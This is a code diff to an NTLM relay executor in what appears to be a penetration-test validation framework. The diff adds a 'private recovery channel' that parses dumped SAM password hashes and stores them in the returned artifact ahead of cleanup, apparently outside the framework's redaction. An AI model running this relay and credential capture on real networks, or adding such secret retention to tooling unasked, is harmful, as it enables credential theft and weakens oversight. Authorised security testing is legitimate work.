@@ -55,7 +55,8 @@ from typing import Any, Optional
 from ..recommend import ParamSpec, ParamValue, values
 from ..predicates import any_present
 from .. import proof
-from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
+from ._reveal_common import dump_hashes
+from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                    redact_argv)
 from .process_manager import poll_for_capture
 from .coercion import COERCION_METHODS, coercion_trigger_argv
@@ -269,7 +270,18 @@ class NTLMRelayExecutor(ValidationExecutor):
         return target, extra
 
     # ---------------------------------------------------------------- execute
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
+
     def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
+        # Private recovery channel, populated before downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish_artifact(*args):
+            artifact.update(self._artifact(*args))
+            return artifact
+
         cfg = ctx.config
         v = values(params)
         relay_target = v["relay_target"]
@@ -298,7 +310,7 @@ class NTLMRelayExecutor(ValidationExecutor):
             gate["classifier"] = "denied"
             gate["op"] = "relay"
             errors.append("gate_denied:relay")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         if verdict == "approved":
             gate["classifier"] = "approved"
             gate["op"] = "relay"
@@ -308,7 +320,7 @@ class NTLMRelayExecutor(ValidationExecutor):
                 ctx, victim_dc, v["external_listener"], method)
             terminal_fact = self._terminal_fact(
                 cfg, relay_target, mode, classification, v["external_listener"])
-            return self._artifact(steps, gate, mutation, terminal_fact, False, [classification])
+            return finish_artifact(steps, gate, mutation, terminal_fact, False, [classification])
 
         # 1) start the ntlmrelayx listener (non-blocking). UNVERIFIED invocation.
         if mode == "ldap_rbcd":
@@ -329,9 +341,20 @@ class NTLMRelayExecutor(ValidationExecutor):
         except OSError as exc:
             record("start_listener", listener_argv, None, False, note=f"spawn failed: {exc}")
             errors.append("listener_start_failed")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         record("start_listener", listener_argv, None, True,
                note=f"{mode} listener on {listener_host or '<local>'}")
+
+        def capture_sam():
+            for loot_file in sorted(lootdir.glob("*samhashes*")):
+                try:
+                    loot = loot_file.read_text(encoding="utf-8")
+                except (OSError, UnicodeError):
+                    continue
+                for reveal in dump_hashes(self.technique, loot):
+                    if reveal not in artifact["_reveal"]:
+                        artifact["_reveal"].append(reveal)
+            return _loot_present(lootdir)
 
         # 2) fire the coercion trigger (synchronous) to feed the listener.
         try:
@@ -345,12 +368,17 @@ class NTLMRelayExecutor(ValidationExecutor):
             if mode == "ldap_rbcd":
                 success = lambda out: bool(_RE_RELAY_RBCD_OK.search(out))
             else:
-                success = lambda _out: _loot_present(lootdir)
+                success = lambda _out: capture_sam()
             output, captured = poll_for_capture(
                 ctx.proc_manager, handle, success=success,
                 interval_s=cfg.poll_interval_s, timeout_s=cfg.tool_timeout_s)
         finally:
+            if mode == "smb_sam":
+                capture_sam()
             final_out = ctx.proc_manager.stop(handle)
+
+        if mode == "smb_sam":
+            capture_sam()
 
         output = output + "\n" + final_out  # runtime only; never serialized
         captured = captured or (bool(_RE_RELAY_RBCD_OK.search(output))
@@ -377,7 +405,7 @@ class NTLMRelayExecutor(ValidationExecutor):
         record("sam_loot", listener_argv, RunResult(returncode=None), captured,
                note="SAM loot file present" if captured else "no SAM loot captured")
         terminal_fact = self._terminal_fact(cfg, relay_target, mode, classification)
-        return self._artifact(steps, gate, mutation, terminal_fact,
+        return finish_artifact(steps, gate, mutation, terminal_fact,
                               classification == "action_succeeded", errors)
 
     @staticmethod
